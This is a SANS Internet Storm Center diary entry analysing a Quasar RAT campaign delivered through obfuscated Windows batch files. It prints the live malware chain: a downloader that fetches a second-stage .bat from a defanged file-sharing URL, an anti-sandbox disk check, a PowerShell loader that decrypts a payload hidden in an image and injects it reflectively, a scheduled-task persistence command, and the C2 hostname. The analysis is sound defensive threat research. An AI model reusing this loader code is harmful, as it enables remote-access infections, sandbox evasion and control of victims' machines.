---
title: Quasar RAT Delivered Through Bat Files, (Wed, Jun 11th)
url: https://isc.sans.edu/diary/rss/32036
source: SANS Internet Storm Center, InfoCON: green
date: 2025-06-12
fetch_date: 2025-10-06T22:54:33.967255
---

# Quasar RAT Delivered Through Bat Files, (Wed, Jun 11th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/32032)
* [next](/diary/32038)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Quasar RAT Delivered Through Bat Files](/forums/diary/Quasar%2BRAT%2BDelivered%2BThrough%2BBat%2BFiles/32036/)

**Published**: 2025-06-11. **Last Updated**: 2025-06-11 05:53:08 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Quasar%2BRAT%2BDelivered%2BThrough%2BBat%2BFiles/32036/#comments)

RAT's are popular malware. They are many of them in the wild, Quasar[[1](https://malpedia.caad.fkie.fraunhofer.de/details/win.quasar_rat)] being one of them. The malware has been active for a long time and new campaigns come regularly back on stage. I spotted an interesting .bat file (Windows script) that attracted my attention because it is very well obfuscated. This file is a second stage that is downloaded and launched from a simple script:

```

@echo off
set "DOCX_PATH=%dp0Game_Purchase_Agreement (1).docx"
set "BAT_URL=hxxps://store3[.]gofile[.]io/download/web/60e1cbe3-5bcb-4ce5-9807-096b7ef2152c/stub.bat"
set "STUB_BAT=%dp0stub.bat"
start "" "%DOCX_PATH%"
powershell -noprofile -windowstyle hidden -command "Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%STUB_BAT%'"
start "" /B "%STUB_BAT%"
```

A decoy Office document is opened to make the victim confident. Let's have a look at the stub[.]bat file, the one obfuscated.The file has a "nice" VT score (1/61) (SHA256:06463c161db81b0714be03cd33431730a5fa56e0019901b03ec61943e08f8e9f[[1](https://www.virustotal.com/gui/file/06463c161db81b0714be03cd33431730a5fa56e0019901b03ec61943e08f8e9f/detection)])

Many environment variables are used and "goto" are implemented to forward and back in the document and reconstruct the code:

```

%ywbR5EU0%got%psT9UHn%o%ck4mP% :cFjGe

:: merit cause glow side across trick humble man aunt man
:KVwlg
%wn70F%s%xrXwJ%et%zLQjCV% "BFT0e7D9=;$OM1Hj" && %NV38nVKJ%set%tlIujlLR% "wGIv=ey = "&&%mAyrqy%set "wxzXFAyU=Fu.GetT"
%MqHr7m%s%dOBZ%e%ARwzE%t%SN8O3x1% "BjosEB=.Tripl"
s%CVz5%e%PLqV%t "Ie9m=ray();$"
%y5ysfL1C%se%UnikunR6%t%k44zaPJk% "C209=ilter P" &&%psM62h7K%s%lTgUuB%e%oGydvBuB%t%hOBl% "sRJXLMHX=r');$"&& %KNhC9wR%se%DID28qi%t%AgqDi% "DYcN9B=e[]]@(" && s%ENstJM%e%IRLW%t%A6NRgyd% "k3mI=s8 $OM1" &&%mG1f%se%DWxnLG%t%Oaiu% "YZrsX=rovide" && set "NmTYyNq2=Invo"
g%yQH7u6H%oto :bPY4

:: reject purity renew better trick
:iaryMFz
s%dEnHV9%e%KlnkeRpX%t%CTZS% "INBx=9dihP4hL+W2iB2H0u+lsbZDuvimWfacpQlS1QtvFkz3HJHmQ/+fRyQmOGIySz8noyZRUvv8N2AANhsHyXPLu7v9C0UUWeVPeCrfxZ6fgO1tiA+snvgjBybIc4dLxLLLuKGBUFC/5s2769pZpG1f3Z5ESc78Mgu6r7vlTDR1jw1Ij7J3v1qbePCzXtVOTTZi4W27TCpmLlOdDxgTOX3S+28cdUjQd5Q/PwGHesVj8KmCF8fBs1gGjLBUuINaJZuw2mIMWUjGYIbi7offuFiGATIbI9W2g1ngygxsUdOgxAdA3abf0P9L/M/uLCqWCpIl5U+Obj4u8E2ZvM8eICTZqsALHLz5DFGUl7U/L4cGZRbVWQBwv63bKltQv3q3ma296OsEzTltU5e3TEmGgzq3qPtahJQtYmWr4KTs8CUVdjNUDmfgkSO/NsnDtcE1KhO4ufE0sqnQbJ/WqXgvPEgyWB5/KBV3Rm8IS3/9vflXACiW3Po5tpXRLrToKzHQd8O7glrGljxmKMjuROsHCIrrAPbU5HgyH7vakWyhkqYRwCTw1xic91VIlSwjhFBC0PK6OViBiExWp8xa3KmLda2Gc/mprS3n8xo7xBgQplNRyd24yTNMPjcJExj3te3mXma5UUHMBgCL8BtwS4y9J6nRJ+pN2t1U/MCPWhqkuODuc/ND8SuJ8b2g2BVvLv+30nNEmNgvIaM5CHM05G3P9uoB4XZl1sOVKREa/AqbpdjUBkqFhOJcRVqw/3fdG+pai+MGXYpcpQF0HjNkB69FHPksUn91MneNXnPPx1+VfJ6tCJtrRlrA47yXXInkIdCK4JEsuSKLU8n6Lky1FJ7R7GYRrCqaka0uINE5/0DYjD1MNQLswQmap1B1HhSm+X3m7eh2ZLGFOYwX3oKunKeCXk1tFRVbXoKSHkZgxt5nmlNwxQRVXIyzv1Feu85gIWkiMxihIczvfCrFRMJPDW80JSZWpKs1y/iZlja9AWqoE7pjs6buf7hEhN8d/UJmQcVB20AuvQh+RqGRUD3y4YzFEdTSPMSsC9DaQoZZkL/PVFn8q
```

The script will rebuild code to launch two Powershell instances. The first one is a simple anti-sandbox detection:

```

powershell.exe -ep bypass -w hidden -command $bKOPdCKMepGCO5Y9Yf=(Get-Disk).FriendlyName;if ($bKOPdCKMepGCO5Y9Yf -like '*DADY'+' HARD'+'DIS'+'K*' -or $bKOPdCKMepGCO5Y9Yf -like '*QEMU '+'HARDDI'+'SK*') {taskkill /f /im cmd.exe}
```

It's the first time I see this pretty efficient technique. It will check the system disk type and if it is labelled "DADYHARDDISK" or "QEMU HARDDISK", it will kill itself. That was the case in my sandbox, to I had to patch the script :-)

```

PS C:\Users\REM>(Get-Disk).FriendlyName
QEMU HARDDISK
```

The second Powershell is the core infection path. It will download a PNG image that contains the payload to inject into a process. The image is fetched from: hxxps://i[.]ibb[.]co/NdvrqCDQ/j1bz[.]png.

![](https://isc.sans.edu/diaryimages/images/1bz.png)

The Powershell code is also obfuscated and relies on environment variables defined in the original Bat file!

```

powershell.exe -ep bypass -w hidden -command $cVql = [System.Convert]::FromBase64String(($env:vFSz6.Split('.')|ForEach-Object{(Get-Item ('Env:'+$_)).Value})-join'');$yqt3Czji = [Type]::GetType('System.Security.Cryptography.TripleDESCryptoServiceProvider')::new();$yqt3Czji.Key = [byte[]]@(30,81,30,197,159,52,214,36,169,151,167,116,102,113,244,65);$yqt3Czji.Mode = 'ECB';$yqt3Czji.Padding = 'PKCS7';$yRCM = $yqt3Czji.CreateDecryptor().TransformFinalBlock($cVql,0,$cVql.Length);$XfQ7 = New-Object ('System'+'.IO'+'.Me'+'morySt'+'ream') -ArgumentList (,$yRCM);$nlt6O = New-Object ('Syste'+'m.IO'+'.Me'+'morySt'+'rea'+'m');$tej8sBLE = New-Object ('Syst'+'em.IO.'+'Compre'+'ssio'+'n.G'+'ZipSt'+'rea'+'m') -ArgumentList ($XfQ7, [IO.Compression.CompressionMode]('Decompress'));$tej8sBLE.CopyTo($nlt6O);$UWoQx = $nlt6O.ToArray();$uGjPve = New-Object ('Sys'+'tem'+'.Secu'+'rity'+'.Cry'+'ptogra'+'phy.'+'SHA256'+'Crypt'+'oSer'+'viceP'+'rovid'+'er');$s86s8 = $uGjPve.ComputeHash($UWoQx);$OM1Hjgf = [byte[]]@(26,203,98,66,123,85,187,210,99,96,236,147,173,234,222,190,107,34,223,203,242,234,205,211,250,22,173,56,84,163,184,31);if (-Not (Compare-Object $s86s8 $OM1Hjgf)) {$dfGJB = (Get-CimInstance ('Win32_'+'Pro'+'cess') -Filter ProcessId=$pid).CommandLine;foreach ($EsLaimFu in [AppDomain]::CurrentDomain.GetAssemblies()){if ($EsLaimFu.GlobalAssemblyCache -And $EsLaimFu.Location.Contains('mscorl'+'ib.dll')){foreach ($pMdg2Ay in $EsLaimFu.GetType('Syste'+'m.Refl'+'ect'+'ion.As'+'sembly').GetMethods('Pub'+'lic,St'+'atic')){if ($pMdg2Ay.ToString()[38] -eq ')') {$pMdg2Ay.Invoke($null, (,$UWoQx)).EntryPoint.Invoke($null, (,[string[]](,$dfGJB)))}}}}}
```

You can read interesting strings like "GetAssemblies", "SystemReflectionAssembly" or "Invoke" that are used to perform code injection.

Persistenace is implemented throught a scheduled task:

```

schtasks /create /xml 4TCqY.xml /tn f4a22537-7897-4a26-90de-51508f11b41d
```

The C2 server is JamieRose-42682[.]portmap[.]io.

[1] <https://malpedia.caad.fkie.fraunhofer.de/details/win.quasar_rat>
[2] <https://www.virustotal.com/gui/file/06463c161db81b0714be03cd33431730a5fa56e0019901b03ec61943e08f8e9f/detection>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Bat](/tag.html?tag=Bat) [Malware](/tag.html?tag=Malware) [Obfuscation](/tag.html?tag=Obfuscation) [Powershell](/tag.html?tag=Powershell) [Quasar](/tag.html?tag=Quasar) [RAT](/tag.html?tag=RAT)

[0 comment(s)](/diary/Quasar%2BRAT%2BDelivered%2BThrough%2BBat%2BFiles/32036/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/32032)
* [next](/diary/32038)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![...